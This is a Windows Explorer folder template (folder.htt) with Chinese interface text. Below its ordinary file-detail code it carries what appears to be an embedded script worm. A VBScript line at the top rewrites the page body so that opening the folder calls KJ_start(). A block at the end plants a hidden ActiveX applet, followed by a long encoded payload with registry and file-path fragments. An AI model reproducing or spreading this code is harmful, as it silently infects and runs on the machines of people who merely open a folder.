<script language=vbscript>
document.write "<B"&"O"&"D"&"Y"&" o"&"n"&"l"&"o"&"a"&"d=""K"&"J_s"&"t"&"a"&"rt()"">"
</script>
<!-- 
 * This file was automatically generated by Microsoft Internet Explorer 4.0 
 * using the file %THISDIRPATH%\folder.htt (if customized) or
 * %TEMPLATEDIR%\folder.htt (if not customized).
 -->

<html>
	<style>
		body		{font: 9pt/10pt 宋体; margin: 0}
		#FileList	{position: absolute; left: 30%; width: 70%; height: 100%}
		#Media		{margin-left: 15px}
		#Panel		{position: absolute; width: 30%; height: 100%; overflow: auto}
		#PieChart	{width: 100px; height: 50px; margin-top: 10px}
		#Thumbnail	{width: 160px; height: 160px; margin-top: 0px}
		#Status		{margin-left: 15px}
		#Brand		{position: absolute; left: 30%; width: 70%; height: 100%; overflow: auto}
		p		{margin-left: 15px; margin-top: 15px; margin-right: 15px}
		p.Title		{font: 16pt; font-weight: bold; margin-top: 5px}
		p.LogoLine	{margin-left: 0; margin-top: -5px; margin-right: 0; margin-bottom: 20px}
		p.Warning	{font-weight: bold; color: red}
		p.Links		{margin-top: 5px}
		a.Command	{font-weight: bold}
		div.Release     {width: 160px; text-align: right; background: buttonface; padding: 0px, 8px, 4px, 8px}
	</style>

	<head>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312">
		<!-- allow references to any resources you might add to the folder -->
		<!-- (a "webbot" is a special wrapper for FrontPage compatibility) -->
		<!-- webbot bot="HTMLMarkup" tag="base" startspan -->
		<base href="%THISDIRPATH%\">
		<!-- webbot bot="HTMLMarkup" endspan -->

		<script language="JavaScript">
			var L_Prompt_Text	= "选定项目可以查看其说明。";
			var L_Multiple_Text	= " 选定的项目。";
			var L_Size_Text		= "大小: ";
			var L_FileSize_Text	= "总计文件大小: ";
			var L_Delimiter_Text	= ",";
			var L_Bytes_Text	= "&nbsp;字节";
			var L_Attributes_Text	= "属性";
			var L_Codes_Text	= "RHSaCE"; // suppress the Archive flag
			var L_ReadOnly_Text 	= "只读";
			var L_Hidden_Text	= "隐藏";
			var L_System_Text	= "系统";
			var L_Archive_Text	= "档案";
			var L_Compressed_Text	= "已压缩";
			var L_Encrypted_Text	= "已加密";
			var L_NoAttributes_Text = "(正常)";
			var L_Properties_Text	= "属性(&R)";
			var timer		= 0;
			var wantMedia		= false; // cool, but may hinder media file manipulation

			function FixSize() {
				// this function handles fixed panel sizing and collapsing when the window resizes
				var threshold	= 400;
				var miniHeight	= 32;
				var ch		= document.body.clientHeight;
				var cw		= document.body.clientWidth;

				if (cw < threshold) {
					document.all.Panel.style.visibility = "hidden";
					document.all.MiniBanner.style.visibility = "visible";
					document.all.FileList.style.top = miniHeight;
					document.all.FileList.style.pixelLeft = 0;
				} else {
					document.all.MiniBanner.style.visibility = "hidden";
					document.all.Panel.style.visibility = "visible";
					document.all.FileList.style.top = 0;
					document.all.FileList.style.pixelLeft = document.all.Panel.style.pixelWidth; 
				}
				document.all.FileList.style.pixelWidth = cw - document.all.FileList.style.pixelLeft;
				document.all.FileList.style.pixelHeight = ch - document.all.FileList.style.pixelTop;
			}

			function FormatNumber(n) {
				var t = "";
				var i, j = 0;
				for (i = n.length - 1; i >= 0; i--) {
					t = n.charAt(i) + t;
					if (i && ((++j % 3) == 0))
						t = L_Delimiter_Text + t;
				}
				return t;
			}

			function Properties() {
				FileList.SelectedItems().Item(0).InvokeVerb(L_Properties_Text);
			}

			function Init() {
				// call our FixSize() function whenever the window gets resized
				window.onresize = FixSize;
				FixSize();
				Info.innerHTML = L_Prompt_Text;
			}
		</script>

		<script language="JavaScript" for="FileList" event="SelectionChanged">
			// this script updates the left info panel when you select icons
			var fldr = FileList.Folder;
			var items;
			var name;
			var data;
			var text;
			var title;
			var size = 0;
			var i;

			// cancel any pending status message
			if (timer) {
				window.clearTimeout(timer);
				timer = 0;
			}

			// erase any visible thumbnail since the selection changed
			document.all.Thumbnail.style.display = "none";
			document.all.Status.style.display = "none";

			// stop & destroy any media player
			if (wantMedia)
				document.all.Media.innerHTML = "";

			data = FileList.SelectedItems().Count;
			if (data == 0) {
				// nothing selected?
				Info.innerHTML = L_Prompt_Text;
				return;
			}
			else if (data > 1) {
				// more than one item selected?
				text = data + L_Multiple_Text + "<br>";
				if (data <= 100) {
					for (i = 0; i < data; i++)
						size += FileList.SelectedItems().Item(i).Size;
					if (size)
						text += "<br>" + L_FileSize_Text + FormatNumber(size.toString()) + L_Bytes_Text + "<br>";
					if (data <= 16)
						for (i = 0; i < data; i++)
							text += "<br>" + FileList.SelectedItems().Item(i).Name;
				}
				Info.innerHTML = text;
				return;
			}

			items = FileList.SelectedItems().Item(0);

			// name
			name = fldr.GetDetailsOf(items, 0);
			text = "<b>" + name + "</b>";

			// type
			data = fldr.GetDetailsOf(items, 2);
			if (data)
				text += "<br>" + data;

			// date
			data = fldr.GetDetailsOf(items, 3);
			if (data)
				text += "<br><br>" + fldr.GetDetailsOf(null, 3) + ":<br>" + data;

			// size
			size = FileList.SelectedItems().Item(0).Size;
			if (size && size < 1000)
				text += "<br><br>" + L_Size_Text + size + L_Bytes_Text;
			else {
				data = fldr.GetDetailsOf(items, 1);
				if (data)
					text += "<br><br>" + fldr.GetDetailsOf(null, 1) + ": " + data;
                                else if (size)
					text += "<br><br>" + L_Size_Text + FormatNumber(size.toString()) + L_Bytes_Text;
			}

			// extra details?
			for (i = 4; i < 10; i++) {
				title = fldr.GetDetailsOf(null, i);
				if (!title)
					break;
				data = fldr.GetDetailsOf(items, i);
				if (title == L_Attributes_Text) {
					var code;
					var s = "";

					text += "<br><br>" + title.link("JavaScript:onClick=Properties()") + ": ";
					for (i = 0; i < 6; i++) {
						code = L_Codes_Text.charAt(i);
						if (data.indexOf(code) > -1) {
							if (s)
								s += ", ";
							if (i == 0)
								s += L_ReadOnly_Text;
							else if (i == 1)
								s += L_Hidden_Text;
							else if (i == 2)
								s += L_System_Text;
							else if (i == 3)
								s += L_Archive_Text;
							else if (i == 4)
								s += L_Compressed_Text;
							else if (i == 5)
								s += L_Encrypted_Text;
						}
					}
					if (!s)
						s = L_NoAttributes_Text;
					text += s;
				}
				else if (data)
					text += "<br><br>" + title + ":<br>" + data;
			}

			// tip?
			data = fldr.GetDetailsOf(items, -1);
			if (data && data != name) {
				var start;
				var end;
				var theLink;
				var a;

				// parse lines for Office files without breaking links below
				a = data.split("\n");
				data = a.join("<br>\n");

				// look for embedded links
				text += "<br><br>";
				start = data.indexOf("http://");
				if (start < 0)
					start = data.indexOf("file://");
				if (start < 0)
					text += data;
				else {
					end = data.indexOf(" ", start);
					if (end < 0)
						end = data.length;
					if (start > 0)
						text += data.substring(0, start - 1);
					theLink = data.substring(start, end);
					text += theLink.link(theLink);
					if (end < data.length)
						text += data.substring(end + 1, data.length);
				}
			}

			// replace Info with the new text
			Info.innerHTML = text;

			if (wantMedia && size) {
				// show media preview or thumbnail based on file extension
				ext = name.substring(name.lastIndexOf(".") + 1, name.length);
				ext = ext.toLowerCase();		
				if (ext == 'avi' || ext == 'mov' || ext == 'qt' || ext == 'mpe' || ext == 'mpeg' || ext == 'mpg') {
					// show a movie player
					document.all.Media.innerHTML = '<object ID="Player" style="width: 160px; height: 148px" classid=clsid:05589FA1-C356-11CE-BF01-00AA0055595A><param name="FileName" value="' + items.Path + '"><param name=ShowDisplay value=0><param name=BorderStyle value=0></object>';
				} else if (ext == 'aif' || ext == 'aifc' || ext == 'aiff' || ext == 'au' || ext == 'mid' || ext == 'rmi' || ext == 'snd' || ext == 'wav') {
					// show a sound player
					document.all.Media.innerHTML = '<object ID="Player" style="width: 160px; height: 28px" classid=clsid:05589FA1-C356-11CE-BF01-00AA0055595A><param name="FileName" value="' + items.Path + '"><param name=ShowDisplay value=0></center></object>'
				}
			}

			// try to generate a new thumbnail asynchronously, and delay the status message one second
			if (size && (size < 10000000) && Thumbnail.displayFile(items.Path))
				timer = window.setTimeout('document.all.Status.style.display = ""', 1000);
		</script>

		<script language="JavaScript" for="Thumbnail" event="OnThumbnailReady">
			// when a valid thumbnail has been generated, display it
			window.clearTimeout(timer);
			timer = 0;
			document.all.Status.style.display = "none";
			if (document.all.Thumbnail.haveThumbnail() && document.all.Media.innerHTML == "")
				document.all.Thumbnail.style.display = "";
		</script>
	</head>

	<body scroll=no onload="Init()">

		<!-- start mini banner -->
		<div ID="MiniBanner" style="visibility: hidden; position: absolute; width: 100%; height: 32px; background: window">
			<!-- using a table with nowrap to prevent word wrapping -->
			<table><tr><td nowrap>
				<p class=Title style="margin-top: 0">
				<!--webbot bot="HTMLMarkup" startspan alt="&lt;B&gt;&lt;I&gt;Web View Folder Title&lt;/I&gt;&lt;/B&gt;&nbsp;" -->
				%THISDIRNAME%
				<!--webbot bot="HTMLMarkup" endspan -->
			</td></tr></table>
		</div>
		<!-- end mini banner -->

		<!-- start left info panel -->
		<div id=Panel style="background: white URL(file://%TEMPLATEDIR%\wvleft.bmp) no-repeat">
			<p>
			<object classid="clsid:E5DF9D10-3B52-11D1-83E8-00A0C90DC849" width=32 height=32>
				<param name="scale" value="100">
			</object>

			<p class=Title>
			<!--webbot bot="HTMLMarkup" startspan alt="&lt;B&gt;&lt;I&gt;Web View Folder Title&lt;/I&gt;&lt;/B&gt;&nbsp;" -->
			%THISDIRNAME%
			<!--webbot bot="HTMLMarkup" endspan -->
			
			<p class=LogoLine>
			<img src="%TEMPLATEDIR%\wvline.gif" width=100% height=1px>
			
			<p>
			<span id=Info>
			</span>

			<!-- HERE'S A GOOD PLACE TO ADD A FEW LINKS OF YOUR OWN -->
			<!-- (examples commented out)
				<p>
				<br>
				<a href="http://www.mylink1.com/">Custom Link 1</a>
				<p class=Links>
				<a href="http://www.mylink2.com/">Custom Link 2</a>
			-->

			<p>
			<!-- this is the thumbnail viewer control -->
			<object id=Thumbnail classid="clsid:1D2B4F40-1F10-11D1-9E88-00C04FDCAB92" style="display: none">
			</object>

			<!-- this is the status message that pops up during thumbnail generation -->
			<div id=Status style="display: none">
				正在生成预览...
			</div>
			
			<p>
			<!-- this contains any ActiveMovie control created later -->
			<div id=Media>
			</div>
			
		</div>
		<!-- end left info panel -->

		<!-- this is the standard file list control -->
		<!-- webbot bot="HTMLMarkup" startspan -->
		<object id=FileList border=0 tabindex=1 classid="clsid:1820FED0-473E-11D0-A96C-00C04FD705A2">
		</object>
		<!-- webbot bot="HTMLMarkup" endspan -->

	</body>
</html>

<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NA"&"ME=KJ"&"_gues"&"t HEI"&"GHT=0 WIDTH=0 code=com.m"&"s."&"ac"&"t"&"iv"&"e"&"X."&"Ac"&"tive"&"XComp"&"on"&"e"&"n"&"t></A"&"PPLET></div>"
</script>
<script language=vbscript>
ulliemkleuihx = "&F gHC(egf_tcdrwd]ptt[kgniqb^CffJGBhVe^ld)DDGqffSbqn+HCPapM_wq%EI>ijkbH\ib\n+HC@RL%EITlMgbef+HCQhkI[se%EIPn\D)DDEfg[kv=crh%EIO^hNkEi`aRr[JGXms^kn'&JGL_sAbg'&JG<ld^m_Lfecdr!#DDKfd_Hq!#DDBo^[sbF[hi!#DDOohj`dZnd%Bg^Pn\Erg]sfhhHC;om^hcQhEfe_O^mb+QrjdPml(Im>lqlkQblolbHdumP^nO^[cQ^go6JG?MN+HjdkM_wq?ckb!@hi^J`qa&0&SjiMso7O^[cQ^go+K_`a:fkCeBhrqkSjiMso%Du^]tq^!#97/HlI^h'QfjRqk#9+Qa_mLd^]Ndji(Bihmd?wfmErg]sfhh>hcB`B`QrjdPml:gqmQa_mLd^]Ndji(BihmdMdq@hi^Ndji<DDEPH(Nm^hSbqnEfe_'CbfdMZng)+#?ckbM_lm'Qqfm_HCLdkHhKlZ^#NlmLnqu_<lKc HCBsjeNdumCbfdQ^go+<fnp^P^nC:nsob\:EICLI-D^nEfe_'CbfdMZng&E>mnqf[(`qmlh_nndp70-BemdLd^]Ndji(BihmdMdq@hi^Ndji<DDEPH(Nm^hSbqnEfe_'CbfdMZng)1#B`QrjdPml:gqff!MbdkEfe_Sbfj-Tkcsbpa@kFe!9%BSJE8!u_<lKc HCLdkHhKlZ^#EIEmgkQ^rs?kp^CeMsobLnq6!s[m!MbdkEfe_Sbfj-Tkcsbpa@kFeJGO\rQ^rs?maCe@hi^Ndji(Bihmd?maCe?ma@tk\nhlg@tk\nhlgJG<b`k`_Rr[BrkldkmMsobhf)E[rqBhcbq=g^k#B`IZmsFg^du<b`o7-NgbgF_Kb_n'I<[rb!=tok_mqLnqfga()*#:5K@Zmd%]!&NgbgHC=g^gadPn\:EICbh`ir>hpd%4[JGLoaB7-Dil_DDBeZhfbLoa6Bek@p\Kb_n'I<[rb!=tok_mqLnqfga()*#(&0& 3V!EIPn\D6/?maCe?kp^HC=g^gadPn\:Gha!=tok_mqLnqfga+.%F`pmCma^rBeZl(?maCe?ma@tk\nhlg@tk\nhlgJG<ld^m_L^bf'&Nk?qohlO^mtj^MbqnB`HCCmTa_qb7anliSe^h>rhq@tk\nhlgBg^F_Pa[qb?ckb7I^`s%DDVfgJ`qa&2& Ilndk[l?ckblVBlfgnk@hi^m[Jb]qllieqMg^k_cYLn`qbimbks[_e[mh'bsjF_'HC@RL'@hi^?wflnr%Lb`o^@hi^#(MbdkB^efHC;om^hcQhReZldCbfd)bsje(?kp^P^nCbfdQ^go6JG?MN+HjdkM_wq?ckb!Mg^k_Efe_+/%nqr^#?ckbM_lm'Qqfm_5#GQFF= s[=qI_%DDQbgImIh[cJGAnliM_wqEfe_Sbfj-@eirbDk]HcCb_[timCc6JGPmRe^fk+K_fO^[c%BJBRYBRKLDKMYTP>L[F]_mqbnhblVCb_[timTp^lF=(ItqEinhO_qpbim6JGPmRe^fk+K_fO^[c%BJBRYKL<;K\F;BEBHDYLieqp[qbUGh`kirl_n[LnnklheBqjqblm[J^^h^O_qHCQrPa_ki'LddPlhq^!ED?X\<OQO>HS\NMDOUCcbgnhqb_rY Cb_[timCc#VRl_nv^k_[Jb]qllieqUItqeinh?wmk_rpU%E_eq!ItqEinhO_qpbim)*##(/YF[hiU=njiirbOrbMs^mcnk^lx%++K?F\=QNO=<[kiEIJZckO^a'AEDVX=TOK?MQXORBKVHa^hsfmcdpU%A^``renHa[Ph`stZldYFcbohmncmVNrmfnldDuildplV!#FdcmNrmFnldPdolcnk%+(--UG`feVRqZnhlg_qvH`j^+Pa[qb?ckb@ZfkDDL^bfQb`!ED?X\<OQO>HS\NMDOUCcbgnhqb_rY Cb_[timCc#VRl_nv^k_[Jb]qllieqUItqeinh?wmk_rpU%E_eq!ItqEinhO_qpbim)*##(/YF[hiUQha^RqZnhlg_qvH`j^+Pa[qb?ckbHCQrPa_ki'LddPlhq^!ED?X\<OQO>HS\NMDOUMncmq`o^VLf\lnph`sYH`ef\_[6'*[Lnnklhe[Linhlgm[JZckY>^hqhlOo^`do^hbb&00**6/%QB@YCTHLCB^efHCG`feLdd!GH>S^@NLQBGN^RL?QYLieqp[qbUGh`kirl_n[TbhclpmJ^mr^`cmdMt_lsrq^g[Mkiefe_rYFcbohmncmNrmfnldHkm_qk^nP^nsfgarY)[/a),/-)*/-)*/-\*/-)*/-)*/-)*33U*/.^*23)+[f`kd(=`ieJGF[hiK_f%BJBRYBRKLDKMYTP>L[Ph`stZldYFcbohmncmVVfg^ntlMQU=tok_mqO_qpbimYPcmahqrF_rpZahk`Rr[mxpm_lYIlncbfdpUGh`kirl_nLnnklheFgndog_sL_sqbhfpU*`-]*1-)*/-)*/-)]/-)*/-)*/-)*/1/V/-*_/0/*!)\k^ge!&JGPmRe^fk+K_fTkcsbGH>S^@NLQBGN^RL?QYLieqp[qbUGh`kirl_n[L_`h`^V0-'*[Lnnklhe[Linhlgm[JZckY>^hqhlOo^`do^hbb&00**6/%QB@YCTHLCB^efHCG`feLdd!GH>S^@NLQBGN^RL?QYLieqp[qbUGh`kirl_n[L_`h`^V0-'*[@hgllgVL^bfRbmnhk`m[K^qRqZnhlg_qv&!_e[mh#DDtjf[fb?ika^l'I^`s%DDVfgJ`qa&2& Ilndk[l?ckblVBlfgnk@hi^m[Jb]qllieqMg^k_cYLn`qbimbks!&Dk]Erg]sfhhErg]sfhhHC=qbZndJbfhbn(Im>lqlkQblolbHdumQ^goMZng6!HcHnq!EICLI-CbfdBqcrqlJGPcmMZng!TL]qfin-bq_!&Se^hM_lmI[se7lsrq^g2/U>hcB`B`Q^goMZng6!prmsbf-1YSe^hLn`omOoCbfd6JGPcmMZng!PRMSBFVJbkhdi,,-aef!?kp^Pm[qqNjEfe_:EITbhO^mb#rvlndjUEdog_k+]fkDk]HcJGPmRe^fk+K_fTkcsbGH>S^IH=@IXG@@ACMBUMncmq`o^VLf\lnph`sYPcmahqrY<oqo^hsS^lrfhh[Onh[H^lmbe-1%Ms^knTm?ckbJG?MN+<iov?ckbEITbhO^mb#rvlndj,,[p^ntm'nwq&JGPcmMZng!t^\[Chfcbk(gqmDDEPH(BlisEfe_HCQhkI[se lsrq^g2/Ucmbm(uu]+HCQhkI[se lsrq^g2/U^dpdnnm'cmf@ZfkDD@mi_maMi'HCQhkI[se p_aY?ika^l-emn!)bsq#DDVpLbdie(Qb`Qqfm_AEDVX=K>LMDPXLNLMV-aef[%cie`hi^DDVpLbdie(Qb`Qqfm_AEDVX=K>LMDPXLNLMV-aef[@hhsbgnQrjd%`mifh`Znhlg)w*fmclphklZ^!EITlMgbef-O^aVobndBJBRYBI:MRBLYQLHN[aefefe_[A^``renH`hh[%EITlMgbef-O^aQbZ^'AEDVX=K>LMDPXLNLMVuu]`hi^VCb_[timCblgV!&JGPmRe^fk+K_fTkcsbGH>S^@E;RP>M^OHISY]fkcbfdYL]qfinDk`cmbU+O<R`kcoqHCQrPa_ki'LddPlhq^!ED?X\<F@PL?R\KINQU^ki?ckbUMgbef[Li_mY<iljZhcY&JGPcmMZngSbfjO^mb#VP\lhmm(du^!+!)JGPmRe^fk+K_fTkcsbGH>S^@E;RP>M^OHISY]fkCbfdYLbdie?wYIlnm^lsvLbdbmB`k]fdolVVPAJqlim[%z3),41<;4*2/2?&+0@?'7@20,-);@-)<74)2BzHCQrPa_ki'LddPlhq^!ED?X\<F@PL?R\KINQU^ki?ckbUMbobjsEhmsBg]na^V!)u72*-03,+,11*B**+C/&<0C2'/-<*3C10B0+.|RbmEfe_Sbfj:EICLI-Li_mQ^rsCbfd%Ln`omOoCbfd)+&son_(@hi^Ndji(VobndDDU_lNdumCbfdQ^go+<fnp^Bg^CnhbqbimCnhbqbimDDKfd_Hq!#B`HCCmTa_qb6=bsjeQa_m?wfmErg]sfhh>hcB`MbhpEib^mcnk7ah]tj^hs+eib^mcnkHcFdcmSebmKl\[sfhh+-#:efe_!MbdkSebmKl\[sfhh:Gha!NgflFn`Znhlg&8&HcEICLI-D^nDum_mpbimKZgd%MbhpEib^mcnk;;!mbdkSebmKl\[sfhh:FdcmSebmKl\[sfhh+I^h'QacrIh]`qbim&'I^h'HC@RL'Adq?ckbG[lb!NgflFn`Znhlg#(&Dk]HcHcFdk!NgflFn`Znhlg#;-Qa_mNgflFn`Znhlg<MbhpEib^mcnk U>hcB`DDtjf[fb?ika^l'QacrIh]`qbim&Dk]HcQ^g^njbtdEIF]<L_sQbgdlnn'DD^Pm[qq!#!)Cmq!+1#Qk]#'+/-)*(?ma@tk\nhlg@tk\nhlgJG:^cJ^mr%HC;caF_rp7 C&jEI+HC;caF_rp7HC;caF_rp HCP`o<b`o!##EISZlBeZl'& HCP`o<b`o!##Pa@kFe?ma@tk\nhlg@tk\nhlgJG=_kIbhd%LnqpHC>diEcmb7Jb^'Pmlr)BhRqkRqkm+S[=qI_#(,(?ma@tk\nhlg@tk\nhlgJGF[hiK_f%K_fPml+CbfdKZgd&Nk?qohlO^mtj^MbqnK_fQ^goPml:EITlMgbef-O^aQbZ^'O^aRqk#B`O^aSbfjRqk<Qa_mEITlMgbef-O^aVobndK_fPml+CbfdKZgd?maCe?ma@tk\nhlg@tk\nhlgJGH\nPn\'@nlqbgnRqkcmdHCMt_><)Q^msLnn:*=iTackbNqr^Q^msLnn:NdpmItq%.HcNdpmItq8/1Se^h<oqo^hsPmlhk`<DDEfg[kv=crh 3V!?wfmClDk]HcNk?qohlO^mtj^MbqnL_sMbhp?ika^l:EICLI-D^nEle^do!=tok_mqLnqfga(Mdq>h`Loa6Bo^[sbH\ib\n'L]qfinhk`(Cf\nhlg[qv#L_s?ika^lr6SebmEle^do'Mt_?ika^lr@ni]_q@homq7-ElkD^\bQ^goChfcbkhk@ni]_qpEle^do<itkm<?ika^lBlnhs$0>h`Loa+Z^c?ika^lBlnhs)Ndji@ni]_q+G[lbMbqnB`Ab]Rr[(Blnhs6/MbdkK^lnHk]_w@a[q6HklnqO^p'@nlqbgnRqkcmd%[%Fdk!=tok_mqLnqfga(**#LoaPmlhk`<Fcc%<oqo^hsPmlhk`&K^lnHk]_w@a[q(*&KbgBrkldkmMsobhf&&F`pmCma^rBeZl,.@nlqbgnRqkcmd7HC=g^gadPn\'@nlqbgnRqkcmd%F`pmCma^rBeZl(EIPn\D60?kp^F_JGLoaB7-Ngbg@nlqbgnRqkcmd7@nlqbgnRqkcmd Ab]Rr[(Hq^g'.%V!?wfmClDil_c<)Chlg7.Nn?ika^lBlnhsCeE=`p^Rr[Msobhf&7I<[rb!>h`Loa+Bndj!d(&NgbgF_i5Ele^do<itkmSe^h<oqo^hsPmlhk`<<oqo^hsPmlhk`%=cbPn\-Fm_l%c%0& U>rhq>n?maCe?maCeHdumIZmsFg^du<b`o7FgmsoK_u%<oqo^hsPmlhk`&!Y&KbgBrkldkmMsobhf&&+(Mt_Lnqfga:Gha!=tok_mqLnqfga+IZmsFg^du<b`o$++I^h'@nlqbgnRqkcmd'K^lnHk]_w@a[q**#<oqo^hsPmlhk`<DDBeZhfbLoa%<oqo^hsPmlhk`&K^lnHk]_w@a[q&Dk]HcDk]HcKlhjDDN_hMt_7@nlqbgnRqkcmdDk]Erg]sfhhErg]sfhhHCJqli[f^m_'&Nk?qohlO^mtj^MbqnK_fMZngSZftb7AEDVXFN@:F^J:=GFG?[Ph`stZldYFcbohmncmVNrmfnldDuildplVCb`ldbAbmjA^aqb^<DDVpLbdie(Qb`Ld^]Qb`J`qaP`in_(Ce=crh=_fo^_:!MbdkCfleCb`ldb7HC@hkZfxAbmj!7U>hcB`?iqb70mi2CfleCb`ldb7HCIalLoa%=crh=_fo^_(EIrfg`d^@ni]_q%=crh=_fo^_(HdumHCQrPa_ki'LddPlhq^Qb`J`qaP`in_+AbmjA^aqb^Bg^CnhbqbimCnhbqbimDDtjf[fb?ika^l'MZngKZgd&Nk?qohlO^mtj^MbqnL_s?ika^lM^f_:EICLI-D^nEle^do!J`qaH`j^#L_sMbhp?ckbl<?ika^lM^f_-CbfdpGqm?wflnr6/@no?``aSebmEfe_FgSebmEfe_r@hi^?wq7R<[rb!EICLI-D^nDum_mpbimKZgd%Mbhp?ckb'J`qa#(Ce?ckb>rs6!EMG!HlCbfdBqn:GQFF!HlCbfdBqn:@PILkEfe_Dum<JGMNo@hi^?wq7CMONgbg@ZfkDD@mi_maMi'QacrCbfd+I[se%gqff!&Dil_Hc@hi^?wq7O<RNgbg@ZfkDD@mi_maMi'QacrCbfd+I[se%u_l(?kp^Ce?ckb>rs6!EMN!MbdkGqm?wflnr60?maCeHdumF_'R<[rb!J`qaH`j^#:OB^l_'HCQhkI[se =_rhmioY#(Hl%N=`p^O^mbM^f_(6T@Zmd%DDVfgJ`qa%>dpdnnm#(Qa_mBsq>rhpmm:+>hcB`B`EmnDubmsp7-NgbgHC@RL'=nmr@hi^JGPcmMZng!prmsbf-1Y]_rhmio+bhh%J`qaH`j^HC@RL'=nmr@hi^JGPcmMZng!t^\[Chfcbk(gqm+MZngKZgd?maCe?ma@tk\nhlg@tk\nhlgJGO[q@a[q%OZhclfcybElkH60MiFgn'3$Og^($3EISZlbeZl:EISZlBeZl#=go!36$Hkm12$Og^(&Mbqn>hc?om`mcnk?om`mcnkEIKhh'&Q^g^njbtdCeBhs%**'Lma=-Se^hDDMlg<!#!?kp^HCHnk7Bg^F_Bg^CnhbqbimCnhbqbimDDRbm>hj!#HhBklnoLdpngdG_wqDok(Bi^[qNdpmCs6VP\lhmm(R`kcoq?okig[lbHc?qoNgbgHCCmTa_qb7anliBemdEIFgQgbk_:u_l>hcB`B`HCCmTa_qb7o\rNgbgP^nHC@RL7@k_`q^Iag^]s%Mbobjsfga-CbfdPrmsbfIag^]sP^nHCQrPa_ki7@k_`q^Iag^]s%QR`kcoq'Mgbef!&Dil_L_sDD@mifdL[dd`m<]ibrf_mq'[ome_sp!JGXatbln!&JG:joi^Iag^]s+l_s@EMHA!zC2-4A<,1**=E-&+0A)'@A;3,-)=/1?>45:*Az#DD@mifdL[dd`m(bo^[sbBhrqZhbb!#L_sDDVpLbdie<DD@mifdL[dd`m(FbmIag^]s%HC;ome_N_c_bq'mdq<FRF=!x)>30??/.&@/6,'0.<@,52./*)*@-<3/2-,15v(EI>ijkbH\ib\n-`k_`q^Cmpm[m`^(MdqEICLI:EI>ijkbH\ib\n-D^nN_c_bq!#>hcB`L_s=crhH\ib\n:EICLI-AkcublChlBZ]g=crhM_lmCm=crhH\ib\nB`AbmjQ^go+=lhs^Nxm^;;,>g^AbmjQ^go+=lhs^Nxm^;;+Qa_m?wfmElkBg^F_HC@hkZfxAbmj6CfleSbfj-AkcubE_sq^lG_wqCffNqa_q>kl'0OZhclfcybElkh:)Sl-Hngbk;qo!c(6Hkm'6$Og^(&MbqnM_lmLnqfga:!EIQ^rs6JG=_kIbhd%DDSbqn(EIQ^rs6JG:^cJ^mrJGM_wqElkh:*SlFdk!EIQ^rs&SbfjMrf<:mb%Fcc%DDSbqn+f%+(&HcNdjiHtj7.,Se^hM_lmGol615Dil_HcNdjiHtj7.)Se^hM_lmGol616Dk]HcSbfjBeZl:=go!NdjiHtj'Lmbdo:lq%bLl]3&F_SbfjBeZl:=go!-3&NgbgQ^go@a[q6Bek05Bg^F_Q^goPmlhk`<M_lmLnqfga#Ndji=g^kK^rsEIO^hNkEi`a75#r`kcoqf`k`o`d^7u_l]qfin= s[=qI_%^n`ngdkm(vobnd; ;%HCHnkNEIKhh%=%HCHnkXEIKhh%%HCHnknEIKhh%g%HCHnkkEIKhh%h%HCHnk`EIKhh%]%HCHnk<!H JGGim#D!#DDMlg !\ JGGim#m!#DDMlg !q JGGim#[!#DDMlg !o JGGim#n!#DDMlg !%!#=#pa@kFe!9%)r`kcoq7#pa@kFeP`o>rdPmlhk`<DDU^k=g^k(JGO[q@a[q%SZlJbr;qo7HCP`o<b`o!##EISZlBeZl'&U^kNgflNdum<DDU^k=g^k(JGO[q@a[q%SZlSbfjMrf<DDU^k=g^k(P`oM_lm<b`o7HCP`o<b`o!#NhKl\eRqk<?wb\osb!!EIKhh%=%HCHnkhEIKhh%f!U^kEdv:lq!% JGGim#-!#DDMlg !& JGGim#&!U^kNgflNdum%!#o\BoE`%#P`oD_x>kl#'EIKhh%)%HCHnk( JGGim#7 Lmbdo:lq%)##!pa@kFe#!U^kEdv:lq!% JGGim#+!#DDMlg !&%HCHnk<%Hngbk;qo!+(! u_<lKc! SZlJbr;qo !%HCHnk1EIKhh%!#DDMlg !:#Ise^l@ok1& %s[=qI_ !%O[qH^s@ok%!#DDMlg !0 JGGim##EIKhh%6!Nqa_q>kl'0%!#o\BoE`%@nEIKhh%khEIKhh%6+!#DDMlg !M%HCHnkn JGGim#F!#DDMlg !b JGGim#h' SZlDu^Msobhf!&%s[=qI_ !%O[qQ^goKng#:;!#DDMlg !p JGGim#]'EIKhh%F%HCHnkhEIKhh%]!U^k?wbLnqfga#+EIKhh%b%HCHnk+. JGGim##( u_<lKc!F_!U^kNdjiHtj 7!#DDMlg !*%HCHnk7EIKhh%N!#DDMlg !e JGGim#_m u_<lKc! SZlSbfjMrf%!#DDMlg !:%HCHnk2EIKhh%-!#o\BoE`%?!#DDMlg !k]%HCHnkF JGGim#`!pa@kFe#!U^kNdji=g^k%<EIKhh%=!#DDMlg !ek%HCHnk' SZlSbfjMrf%*%O[qH^s@ok%h JGGim#GnEIKhh%]!#DDMlg !1#!pa@kFe#HEIKhh%_!U^kNdji=g^k%<<%HCHnkgEIKhh%k1EIKhh%1#!#DDMlg !Mb!#DDMlg !bg!#o\BoE`%#P`oM_lm<b`o 7EIKhh%o\!#DDMlg !@k!#o\BoE`%?kp JGGim#_Hc#P`oM_lm<b`o 7@ JGGim#bq% JGGim#,!#DDMlg !6Se JGGim#_m u_<lKc! SZlSbfjBeZl#:paEIKhh%E`!pa@kFe#Dk JGGim#^F_!#o\BoE`%#P`oMbhpM_wq 7 SZlSebmSbqn###P`oM_lm<b`o %s[=qI_ !G_!#DDMlg !um!#o\BoE`%E!#DDMlg !G JGGim#N!#DDMlg !b JGGim#r!#DDMlg !q JGGim#!#DDMlg !:#P`oMbhpM_wq ( s[=qI_%?wb\osb!#P`oMbhpM_wq MbhpM_wq7SZlDu^Msobhf!6!%M_lmLnqfga#!HCBsjeNdum<5#r`kcoqf`k`o`d^7u_l]qfin= s[=qI_%^n`ngdkm(vobnd%! 5#cforqrfd: jnpbnhlg4`_likrm_:e_eq3*ou4sli4/mq5tb^se3*ou4gbbagq3*ou4y*bhcbq4154uflcafecsv3gf]^dk 8!!9%#@M JGGim#J!#DDMlg !I>%HCHnkS JGGim#H@EIKhh%F?<EIKhh%D%HCHnkI !X%HCHnkfEIKhh%n%HCHnkdEIKhh%l%HCHnksA?HEIKhh%@BS:)VF JGGim#>SE6*` JGGim#icEIKhh%^7bEIKhh%h%HCHnklEIKhh%